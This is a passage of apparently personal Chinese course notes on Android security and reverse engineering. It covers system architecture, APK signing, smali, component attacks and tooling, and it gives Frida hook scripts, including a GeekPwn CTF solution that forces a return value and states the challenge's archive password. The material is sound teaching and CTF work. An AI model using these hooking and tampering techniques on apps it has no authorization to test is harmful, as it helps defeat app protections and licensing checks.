title="五层架构"></a>五层架构</h4><ul><li><p>应用层 <code>Apps</code></p></li><li><p><code>API</code> 层 <code>Java API Framework</code></p><ul><li><code>Content Provider</code>：内容提供器 </li><li><code>View System</code>：视图系统，构建应用基本组件</li><li><code>Activity</code>：活动管理</li><li><code>Location</code>：位置管理</li><li><code>Package</code>：包管理</li><li><code>Notification</code>：通知管理</li><li><code>Telephony</code>：电话管理</li><li><code>Window</code>：窗口管理</li><li><code>Resource</code>：资源管理系统运行库 Native C&#x2F;C++ Librares</li></ul></li><li><p>系统运行库 <code>Native C/C++ Librares</code></p><ul><li><code>C/C++</code>程序库</li><li><code>Android</code>运行时库：核心库、<code>ART</code></li><li><code>JVM</code>是<code>java</code>虚拟机，基于栈，执行<code>.class</code>和<code>jar</code>文件。其没有共享机制，使用<code>JIT</code>编译器</li><li><code>DVM</code>是基于寄存器的虚拟机，执行<code>dex</code>文件。允许在有限的内存中同时运行多个进程。由<code>Zygote</code>创建和初始化。具有共享机制，使用<code>JIT</code>编译器</li><li><code>ART</code>(Android 6.0加入)系统性能显著提升，启动更快运行更快，体验流畅，触感反馈即时。更长的电池续航，支持更低的硬件。在<code>apk</code>安装时使用预编译技术</li></ul></li><li><p>硬件抽象层 <code>Hardware Abstraction Layer (HAL)</code></p><ul><li>位于操作系统内核与硬件电路之间的接口层，其目的在于将硬件抽象化。这类似于计算机网络链路层，将下面硬件封装起来。</li></ul></li><li><p>Linux内核层 <code>Linux Kernel</code></p></li></ul><p>总结一下如下图所示：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/android_stack.png" alt="img"></p><h4 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h4><p>可以将其简化为三步：<code>Init</code>启动 —–&gt; <code>Zygote</code>进程启动 ——-&gt;<code>Systemserver</code>进程启动</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_top.png" alt="img "></p><p>首先是<code>Init</code>进程启动：下图为按下电源键后的启动过程，Android设备启动要经过3个阶段，<code>BootLoader</code>、<code>Linux Kernel</code>和<code>Android</code>系统服务，一般情况下，他们都会相应的启动对动画对应。：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_init.png" alt="img"></p><p>严格上讲，Android系统实际上是运行于Linux内核之上的一系列”服务进程”，并不算一个完成意义上的**”操作系统”**；而这一系列进程是维持Android设备正常工作的关键，所以它们肯定有一个”根进程”，这个”根进程”衍生出了这一系列进程。这个”根进程”就是init进程。init进程是Android系统启动的第一个进程。它通过解析init.rc脚本来构建出系统的初始形态。其他的”一系列”Android系统进程大部分也是通过”init.rc”来启动的。因为要兼容不同的开发商，所以init.rc脚本的语法很简单，并且采用的是纯文本编辑的，这样导致它可读性就会很高。</p><p><code>init</code>是<code>Linux</code>系统中用户空间的第一个进程(pid&#x3D;1)，<code>Linux Kernel</code>启动后，会调用<a href="https://link.jianshu.com/?t=http://androidxref.com/6.0.1_r10/xref/system/core/init/init.cpp">&#x2F;system&#x2F;core&#x2F;init&#x2F;Init.cpp</a>的<code>main()</code>方法。</p><p>Zygote进程启动：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_zygote.png" alt="img"></p><h3 id="Android应用渗透测试与调试"><a href="#Android应用渗透测试与调试" class="headerlink" title="Android应用渗透测试与调试"></a>Android应用渗透测试与调试</h3><p>所需工具：</p><ul><li>Android Debug Bridge (ADB)，它是Android开发&#x2F;测试人员不可替代的强大工具。</li><li>Apktool，又名“Android的Burp套件”，是用于Android攻击的必备工具。可以解压反编译apk文件，并修改后重新打包。</li><li>Android Studio，用于Android开发的标准环境，可以用它来修改程序。</li><li>BurpSuite，可以用作代理来检查往返于测试设备的流量。</li><li>Firda，可以将自己的脚本注入到应用程序的运行进程中。可以用于检查被调用的功能，应用程序的网络连接以及绕过证书固定。</li><li>Jadx，反编译工具。</li></ul><h4 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BA%94%E7%94%A8%E6%A0%BC%E5%BC%8F.png" alt="img"></p><h4 id="安装包签名效验"><a href="#安装包签名效验" class="headerlink" title="安装包签名效验"></a>安装包签名效验</h4><p>在消息通信时，必须至少解决两个问题：一是确保消息来源的真实性，二是确保消息不会被第三方篡改。在安装Apk时，同样需要确保Apk来源的真实性，以及Apk没有被第三方篡改。如何解决这两个问题呢？方法就是开发者对Apk进行签名：在Apk中写入一个“指纹”。指纹写入以后，Apk中有任何修改，都会导致这个指纹无效，Android系统在安装Apk进行签名校验时就会不通过，从而保证了安全性。</p><p>要了解如何实现签名，需要了解两个基本概念：数字摘要和数字证书。</p><ul><li>数字摘要，将任意长度的消息变成固定长度的短消息，它类似于一个自变量是消息的函数，也就是Hash函数。数字摘要就是采用单向Hash函数将需要加密的明文“摘要”成一串固定长度的密文，这一串密文又称为数字指纹，它有固定的长度，而且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。</li></ul><p>如何效验：<img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%95%88%E9%AA%8C.webp" alt="img"></p><ul><li>数字证书，接收方必须要知道发送方的公钥和所使用的算法。如果数字签名和公钥一起被篡改，接收方无法得知，还是会校验通过。如何保证公钥的可靠性呢？答案是数字证书，数字证书是身份认证机构（Certificate Authority）颁发的，包含了以下信息：证书颁发机构、证书颁发机构签名、证书绑定的服务器域名、证书版本、有效期、签名使用的加密算法（非对称算法，如RSA）、公钥。</li></ul><p>完整的效验过程：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E5%AE%8C%E6%95%B4.webp" alt="img"></p><p>Android提供了两种对Apk的签名方式，一种是基于JAR的签名方式，另一种是基于Apk的签名方式，它们的主要区别在于使用的签名文件不一样：jarsigner使用keystore文件进行签名；apksigner除了支持使用keystore文件进行签名外，还支持直接指定pem证书文件和私钥进行签名。</p><p>相关签名命令：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jarsigner </span>-verify apkpath<br><span class="hljs-keyword">jarsigner </span>--verbose -certs apkpath<br>keytool -list -v -keystore keystore_file -storepass pwd<br>keytool -printcert -<span class="hljs-keyword">jarfile </span>apk<br></code></pre></td></tr></table></figure><h4 id="smali代码"><a href="#smali代码" class="headerlink" title="smali代码"></a>smali代码</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/smali%E7%B1%BB%E5%9E%8B.png" alt="img"></p><p><strong>对象</strong>以<code>Lpackage/name/ObjectName;</code>的形式表示。前面的<code>L</code>表示这是一个对象类型，<code>package/name/</code>是该对象所在的包，<code>ObjectName</code>是对象的名字，<code>;</code>表示对象名称的结束。相当于<code>java</code>中的<code>package.name.ObjectName</code>。</p><p>例如：<code>Ljava/lang/String;</code>相当于<code>java.lang.String</code></p><p><strong>数组的表示形式</strong></p><p><code>[I</code>，表示一个整型一维数组，相当于<code>java</code>中的<code>int[]</code>。对于多维数组，只要增加<code>[</code>就行了。<code>[[I</code>相当于<code>int[][]</code>，<code>[[[I</code>相当于<code>int[][][]</code>。</p><p><strong>对象数组的表示</strong></p><p><code>[Ljava/lang/String;</code>表示一个<code>String</code>对象数组。</p><p><strong>方法</strong>通常必须详细的指定方法类型<code>（？the type that contains the method）</code> 方法名，参数类型，返回类型，所有这些信息都是为虚拟机是能够找到正确的方法并执行。</p><p>方法表示形式：<code>Lpackage/name/ObjectName;-&gt;MethodName(III)Z</code></p><p>在上面的例子中，<code>Lpackage/name/ObjectName;</code>表示类型，<code>MethodName</code>是方法名。<code>III</code>为参数（在此是3个整型参数），<code>Z</code>是返回类型（<code>boolean</code>）。</p><p>方法的参数是一个接一个的，中间没有隔开。</p><p>一个更复杂的例子：<code>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;</code></p><p>在java中则为：<code>String method(int, int[][], int, String, Object[])</code></p><h4 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h4><ul><li><code>Activity</code>：<ul><li>关于自定义权限。参数介绍，<code>name</code>：权限名，<code>protectionLevel</code>：权限级别。权限级别介绍：</li><li><code>normal</code>：正常权限，该权限并不会给用户或者设备的隐私带来风险，不声明默认为<code>nomal</code>。</li><li><code>dangerous</code>：危险权限，该级别的权限通常会给用户的数据或设备的隐私带来风险，<code>Android6.0</code>以上需要动态申请</li><li><code>signature</code>：只有相同签名的应用才能使用该权限</li></ul></li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AF%BC%E5%87%BA.png" alt="img"></p><ul><li><p><strong>Activity劫持</strong>，当用户安装了带有<code>Activity</code>劫持功能的恶意程序后，恶意程序会遍历系统中运行的程序，当检测到需要劫持的<code>Activity</code>（通常是网银或其他网络程序的等登陆界面）在前台运行时，恶意程序就会启动一个带<code>FLAG_ACTIVITY_NEW_TASK</code>标志的钓鱼式<code>Activity</code>覆盖正常的<code>Activity</code>，从而欺骗输入用户名或密码信息，当用户输入完信息后，程序就会将信息发送到指定的网址或邮箱，然后切换到正常的<code>Activity</code>中。这就是<code>Activity</code>劫持原理。从受影响的角度看，<code>Activity</code>属于用户层安全。</p></li><li><p><strong>串谋攻击</strong>，举例，<code>app A</code>本身无任何权限，它想要“联网并下载某个文件到<code>sd</code>卡上”，这在正常情况下是不允许的，<code>app B</code>拥有联网与写<code>sd</code>卡的权限，并实现了文件下载与保存功能。此时呢，<code>A</code>可以通过访问<code>B</code>来实现文件的下载，从而突破<code>Android</code>系统的权限控制。</p></li><li><p>Service</p><ul><li><code>Service</code>组件是<code>Android</code>系统中的后台进程，主要的功能是在后台进行一些耗时的操作。与其他的<code>Android</code>组件一样，当声明<code>Service</code>时指定了<code>Intent</code>过滤器，该<code>Service</code>默认就可以被外部访问。可以访问的方法有：</li></ul><p><code>startService()</code>：启动服务，可以被用来实现串谋攻击。</p><p><code>bindService()</code>：绑定服务，可以被用来实现串谋攻击。</p><p><code>stopService()</code>：停止服务，对程序功能进行恶意破坏。</p><p>对于恶意的<code>stopService</code>，它破解程序的执行环境，直接影响到程序的正常运行。要想杜绝<code>Service</code>组件被人恶意的启动或者停止，就需要使用<code>Android</code>系统的权限机制来对调用者进行控制。如果Service组件不想被程序外的其他组件访问，可以直接设置它的<code>android:exported</code>属性为<code>false</code>，如果是同一作者的多个程序共享使用该服务，则可以使用自定义的权限。</p></li></ul><h4 id="WebView安全"><a href="#WebView安全" class="headerlink" title="WebView安全"></a>WebView安全</h4><ul><li>WebView任意代码执行</li><li>WebView密码明文存储</li><li>WebView域控制不严格</li></ul><h4 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h4><ul><li>证书文件</li><li>逻辑js文件</li><li>logcat日志</li><li>图片文件</li><li>其他文件</li><li>进程安全，内存访问和修改，通过对客户端内存的访问，有可能会得到保存在内存中的敏感信息（如登录密码，账号等）。测试客户端内存中是否存在的敏感信息（卡号、明文密码等）。</li><li>本地端口开放检测</li><li>外部动态加载DEX安全风险检测</li></ul><h4 id="Android-Studio调试Smali配置"><a href="#Android-Studio调试Smali配置" class="headerlink" title="Android Studio调试Smali配置"></a>Android Studio调试Smali配置</h4><p>我的Android Studio版本是：<code>3.5.3</code>，模拟器为<code>Android 9.0</code>。</p><p>1、在<code>Android Studio</code>上安装<code>smalidea</code>插件，这个插件需要下载后安装，<code>File-&gt;Setting-&gt;Plugins-&gt;install from disk</code>。</p><p>2、安装<code>Apktool</code>，按照官网教程即可。</p><p>3、使用<code>Android Studio</code>将<code>apktool</code>反编译后文件夹作为项目导入，<code>File -&gt; New -&gt; Import project</code>。</p><p>4、配置项目<code>configuration</code>：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_1.png" alt="img"></p><p>5、接下来配置SDK，<code>File -&gt; project structure -&gt; sdk</code>。</p><p>6、从<code>AVD manager</code>启动模拟器，进入开发者选项，选择<code>debug application</code>，打开<code>wait for debugger</code>。</p><p>7、开始debugger Attach：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_2.png" alt="img"></p><p>进行调试：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_3.png" alt="img"></p><h4 id="Android模拟器使用burpsuite抓包"><a href="#Android模拟器使用burpsuite抓包" class="headerlink" title="Android模拟器使用burpsuite抓包"></a>Android模拟器使用burpsuite抓包</h4><p>我使用的<code>Android Studio</code>带的官方模拟器，在电脑上开启<code>burpsuite</code>，打开<code>options</code>添加电脑在局域网中的<code>ip</code>，监听端口（任意指定）。打开启动的<code>AVD</code>的<code>setting</code>，其中有<code>proxy</code>设置，设置为对应的ip和端口即可。</p><p>这里手机上安装burp证书需要特别说明一下，需要把后缀<code>.der</code>修改为<code>.cer</code>。</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/burp_grab.png" alt="img"></p><h4 id="IDA-pro调试-so库"><a href="#IDA-pro调试-so库" class="headerlink" title="IDA pro调试.so库"></a>IDA pro调试.so库</h4><p>1、将<code>IDA</code>安装目录下的<code>dbgsrv</code>复制到<code>AVD</code>中，<code>adb shell</code>启动运行。</p><p>2、<code>adb forward tcp:23946 tcp:23946</code>，进行端口转发，<code>IDA</code>随后<code>remote attach</code>进程，<code>ip</code>为<code>localhost</code>，端口<code>23946</code>。</p><h3 id="移动应用渗透测试框架使用"><a href="#移动应用渗透测试框架使用" class="headerlink" title="移动应用渗透测试框架使用"></a>移动应用渗透测试框架使用</h3><h3 id="Xposed框架"><a href="#Xposed框架" class="headerlink" title="Xposed框架"></a>Xposed框架</h3><h3 id="frida-框架"><a href="#frida-框架" class="headerlink" title="frida 框架"></a>frida 框架</h3><p><strong>Frida</strong>是一款基于<code>python + javascript</code> 的<code>hook</code>框架，适用于<code>android/ios/linux/win/osx</code>等平台。</p><p>安装：</p><p>电脑端：<code>pip install frida-tools</code>。</p><p>Android端：从<code>github release</code>页面下载<code>frida-server</code>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> adb root <span class="hljs-comment"># might be required</span><br><span class="hljs-variable">$</span> adb push frida<span class="hljs-literal">-server</span> /<span class="hljs-keyword">data</span>/local/tmp/ <br><span class="hljs-variable">$</span> adb shell <span class="hljs-string">&quot;chmod 755 /data/local/tmp/frida-server&quot;</span><br><span class="hljs-variable">$</span> adb shell <span class="hljs-string">&quot;/data/local/tmp/frida-server &amp;&quot;</span><br></code></pre></td></tr></table></figure><p>特别的，如果华为手机出现：</p><p>selinux报错</p><p>需要：<code>setenforce 0</code>。</p><p>至此安装完毕，这里练习一个<code>Demo</code>。以下是<code>apk</code>的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> Button mBtnInvokeFunc;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        mBtnInvokeFunc = findViewById(R.id.btn_invoke_func);<br>        setOnClickListener();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOnClickListener</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">OnClick</span> <span class="hljs-variable">onClick</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OnClick</span>();<br>        mBtnInvokeFunc.setOnClickListener(onClick);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hookFunction</span><span class="hljs-params">()</span>&#123;<br>        Log.d(<span class="hljs-string">&quot;hookFunction&quot;</span>, <span class="hljs-string">&quot;UnHooked.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OnClick</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>            Intent intent;<br>            <span class="hljs-keyword">switch</span> (v.getId())&#123;<br>                <span class="hljs-keyword">case</span> R.id.btn_invoke_func:<br>                    hookFunction();<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要<code>hook</code>的是<code>MainActivity</code>中的<code>hookfunction</code>。<code>python hook</code>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>device = frida.get_device(<span class="hljs-string">&quot;emulator-5554&quot;</span>, timeout=<span class="hljs-number">5</span>)<br>process = device.attach(<span class="hljs-string">&quot;top.handsome.toturial&quot;</span>)<br>script = process.create_script(<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">    var MainActivity = Java.use(&#x27;top.handsome.toturial.MainActivity&#x27;);</span><br><span class="hljs-string">    var hookFunction = MainActivity.hookFunction;</span><br><span class="hljs-string">    hookFunction.implementation = function () &#123;</span><br><span class="hljs-string">        console.log(&#x27;Done: isHooked.&#x27;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>)<br><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><h2 id="第二天-01月14日"><a href="#第二天-01月14日" class="headerlink" title="第二天 01月14日"></a>第二天 01月14日</h2><p>Why Android：<code>APP</code>-移动互联网的入口、安全研究的“交集”，<code>Android</code>的市场份额很大。</p><h3 id="Android应用程序"><a href="#Android应用程序" class="headerlink" title="Android应用程序"></a>Android应用程序</h3><h4 id="APK文件格式"><a href="#APK文件格式" class="headerlink" title="APK文件格式"></a>APK文件格式</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_structure.png" alt="img"></p><h4 id="activity生命周期"><a href="#activity生命周期" class="headerlink" title="activity生命周期"></a>activity生命周期</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/activity_lifecycle.png" alt="img"></p><h3 id="逆向技术和方法"><a href="#逆向技术和方法" class="headerlink" title="逆向技术和方法"></a>逆向技术和方法</h3><h4 id="逆向流程"><a href="#逆向流程" class="headerlink" title="逆向流程"></a>逆向流程</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/liucheng.png" alt="img"></p><p>反编译阶段：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_decom.png" alt="img"></p><p>目标定位：</p><ul><li>关键字定位：常规的搜索、<code>grep</code>反编译后的静态代码、动态加载的代码、监控文件变化。</li><li>资源定位：定位<code>UI</code>中的资源变量名，如按钮。<code>res</code>目录中寻找变量对应的索引值。在<code>smali</code>代码中<code>grep</code>所有对该索引的引用。</li><li>日志定位：<code>adb logcat | grep</code>，<code>APP</code>目录下的日志文件、<code>sdcard</code>下的日志文件。打开<code>APP</code>内置的日志开关：重打包，<code>hook</code>，<code>smali</code>注入。</li><li>调用栈跟踪：去<code>hook</code>系统函数打印<code>callback</code>。</li></ul><p>核心目标逆向：</p><ul><li><p>静态分析</p><ul><li>直接分析smali代码</li><li>分析伪java代码</li><li>直接分析arm指令</li><li>分析伪c++代码</li></ul></li><li><p>动态调试</p><ul><li>Android Studio无源码调试</li><li>IDA调试so</li><li>Hook技术</li><li>注入到目标代码，改变执行结果。</li><li>获取某一状态下的变量值。</li><li>hook的本质是代码注入</li><li>Xposed、Frida。</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/frida_xposed.png" alt="img"></p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/frida_hook.png" alt="img"></p><p>使用Frida hook app：</p><ul><li>使用场景：root设备直接运行frida-server、非root设备重打包Frida-garget.so。</li><li>两种模式：Attach已有进程上附加、Spawn新起一个进程。</li></ul></li><li><p>动静结合</p></li><li><p>打造自己的逆向工具链</p></li></ul><h3 id="应用安全防护与对抗"><a href="#应用安全防护与对抗" class="headerlink" title="应用安全防护与对抗"></a>应用安全防护与对抗</h3><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/apk_protect.png" alt="img"></p><h4 id="代码混淆及对抗"><a href="#代码混淆及对抗" class="headerlink" title="代码混淆及对抗"></a>代码混淆及对抗</h4><p>利用反编译工具的bug或漏洞，AndroidManifest.xml，dex，so。转换成伪代码时的bug，Smali -&gt; java，Arm指令 -&gt; C++。链接资源文件时的bug，如特殊的资源文件，超长的资源id。</p><p>将代码变得难以阅读：1、变量名、类名、方法名混淆。2、字符串加密。3、控制流混淆，</p><p>代码混淆工具：Java代码：ProGuard、DexGuard。C++代码：OLLVM。</p><h4 id="反调试技术及对抗"><a href="#反调试技术及对抗" class="headerlink" title="反调试技术及对抗"></a>反调试技术及对抗</h4><p>对抗代码混淆</p><ul><li>变量名、类名、方法名混淆<ul><li>变量重命名、jeb、重打包</li><li>寻找老版本app</li><li>根据开源代码映射</li><li>自动化、自动化相似代码检测</li></ul></li><li>字符串加密<ul><li>静态分析替换</li><li>动态hook</li></ul></li><li>控制流混淆<ul><li>优化反编译工具</li><li>符号执行</li></ul></li></ul><h4 id="加壳和脱壳"><a href="#加壳和脱壳" class="headerlink" title="加壳和脱壳"></a>加壳和脱壳</h4><p>dex加固的流程：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dex_protect.png" alt="img"></p><h3 id="题目-amp-经验分享"><a href="#题目-amp-经验分享" class="headerlink" title="题目&amp;经验分享"></a>题目&amp;经验分享</h3><h3 id="geekpwn-matryoshka"><a href="#geekpwn-matryoshka" class="headerlink" title="geekpwn matryoshka"></a>geekpwn matryoshka</h3><p>这个我在安卓模拟器中安装，<code>apk install</code>即可。随后逆向逻辑，看到只有MainAcitvity.getResult()返回“167042853”才可以，这里我直接使用<code>frida hook</code> <code>getResult</code>函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>device = frida.get_device(<span class="hljs-string">&quot;emulator-5554&quot;</span>, timeout=<span class="hljs-number">5</span>)<br>process = device.attach(<span class="hljs-string">&quot;com.geekpwn_ctf&quot;</span>)<br>script = process.create_script(<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Java.perform(function () &#123;</span><br><span class="hljs-string">    var String = Java.use(&quot;java.lang.String&quot;);</span><br><span class="hljs-string">    var MainActivity = Java.use(&#x27;com.geekpwn_ctf.MainActivity&#x27;);</span><br><span class="hljs-string">    var getResult = MainActivity.getResult;</span><br><span class="hljs-string">    getResult.implementation = function () &#123;</span><br><span class="hljs-string">        var ss = &quot;167042853&quot;;</span><br><span class="hljs-string">        console.log(&#x27;Done: isHooked.&#x27;);</span><br><span class="hljs-string">        return String.$new(ss);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>)<br><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><p>在<code>hook</code>状态下点击<code>pwn</code>按钮获得：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/geekpwn_1.png" alt="img"></p><p>但是这道题目答案在<code>META-INF</code>文件夹下，其下多一个<code>CERT .SF</code>文件，使用<code>file</code>判断它是一个<code>zip</code>文件，然后用<code>m$W2h</code>作为密码循环解压获得一张二维码，扫码，得到<code>MD5</code>串，查询得到答案。</p><h2 id="第三天-01月15日"><a href="#第三天-01月15日" class="headerlink" title="第三天 01月15日"></a>第三天 01月15日</h2><p>移动恶意代码分析</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>各种数据展现了今天安卓平台上的安全威胁愈来愈多。</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_1.png" alt="img"></p><p>攻击手段的多样化，以及安卓端勒索病毒，恶意色情软件数量持续增长。</p><p>以及目前在资产方面的威胁，攻击方式多如下图所示：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_2.png" alt="img"></p><p>以及短信方面的社会工程：</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_3.png" alt="img"></p><p>以及持续扩大的威胁攻击面，表现为地下社会工程数据库，原始的数据积累、完善的黑产分工协作体系。</p><p>病毒的命名体系：一般格式为、&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt;，如Worm.Sasser.b。</p><p>趋势：恶意代码规模持续稳定增长、恶意代码高度产业化、移动端成为APT新战场。</p><h3 id="恶意代码分析"><a href="#恶意代码分析" class="headerlink" title="恶意代码分析"></a>恶意代码分析</h3><h4 id="APK格式"><a href="#APK格式" class="headerlink" title="APK格式"></a>APK格式</h4><p>又是老生常谈的apk文件格式，它是zip格式，编码为ULEB128。</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_4.png" alt="img"></p><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>常用工具：Smaliviewer、APKTOOL&#x2F;baksamli、Dex2jar&#x2F;jd-gui、JEB、IDA、AndroidKiller、AndroidGuard、Virustotal。</p><p>反混淆：<a href="http://apk-deguard.com/">http://apk-deguard.com/</a></p><ul><li>快读定位法，敏感API查找。</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/antian_5.png" 